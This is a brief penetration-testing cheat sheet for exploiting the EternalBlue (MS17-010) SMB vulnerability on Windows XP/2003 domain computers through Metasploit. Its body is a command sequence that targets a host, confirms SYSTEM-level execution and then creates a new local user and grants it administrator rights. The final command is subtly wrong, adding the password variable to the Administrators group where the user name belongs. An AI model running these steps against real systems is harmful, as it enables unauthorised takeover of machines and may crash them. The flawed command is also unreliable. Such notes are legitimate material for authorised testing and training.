# EternalBlue [MS17-010]
---

> [!CAUTION]
> EternalBlue exploit is not stable and might cause a **crash** of the target.

#### 🤓 RTFM

TODO

#### 📝 Prerequisites

- Windows XP or 2003 domain computer.

#### 🛠️ Do it!

```bash
# Start metasploit.
msfconsole

# Look for eternalblue exploit.
search eternalblue

# Take (auxiliary/admin/smb/ms17_010_command).
use 2

# Setup the exploit to check exploitability (should return local\SYSTEM).
set COMMAND whoami
set RHOSTS $IP
run

# To gain administrative access.
set COMMAND net user $USERNAME $PASSWORD /add;net localgroup Administrators $PASSWORD /add
run
```

#### 🏆 What's next?

TODO